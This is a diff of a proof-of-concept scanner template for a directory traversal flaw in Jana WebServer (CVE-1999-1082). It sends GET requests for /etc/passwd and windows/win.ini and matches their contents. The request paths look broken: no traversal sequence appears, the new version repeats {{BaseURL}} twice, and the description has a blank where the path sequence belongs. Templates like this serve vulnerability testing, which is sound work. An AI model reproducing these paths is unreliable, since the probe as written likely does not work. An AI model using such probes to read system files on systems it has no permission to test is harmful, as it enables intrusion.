@@ -1,10 +1,10 @@
 [info]
-author = "ave"
-description = "检测 Jana WebServer 1.0/1.40/1.45/1.46 是否存在目录遍历漏洞。通过向服务器发送特制的 （六点）路径遍历请求，攻击者可绕过路径限制读取服务器上的任意文件。"
+author = "AVE"
+description = "检测 Jana WebServer 1.40 目录遍历漏洞，通过发送特制的  路径遍历序列尝试读取服务器上的任意文件"
 id = "POC-AVE-1999-0928"
-name = "Jana WebServer 目录遍历漏洞 PoC"
+name = "CVE-1999-1082 PoC"
 severity = "medium"
-tags = ["ave-1999-0928"]
+tags = ["cve-1999-1082"]
 vuln_id = [
     "CVE-1999-1082",
     "AVE-1999-0928",
@@ -15,7 +15,7 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}//etc/passwd"
+path = "/{{BaseURL}}/{{BaseURL}}/etc/passwd"
 protocol = "http"
 
 [[poc.requests.matchers]]
@@ -24,28 +24,13 @@ part = "body"
 type = "word"
 words = [
     "root:",
+    "bin:",
     "nobody:",
-    "daemon:",
 ]
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}//autoexec.bat"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "@echo",
-    "SET",
-    "PATH",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}//windows/win.ini"
+path = "/{{BaseURL}}/{{BaseURL}}/windows/win.ini"
 protocol = "http"
 
 [[poc.requests.matchers]]
@@ -55,5 +40,5 @@ type = "word"
 words = [
     "[fonts]",
     "[extensions]",
-    "[files]",
+    "[mail]",
 ]
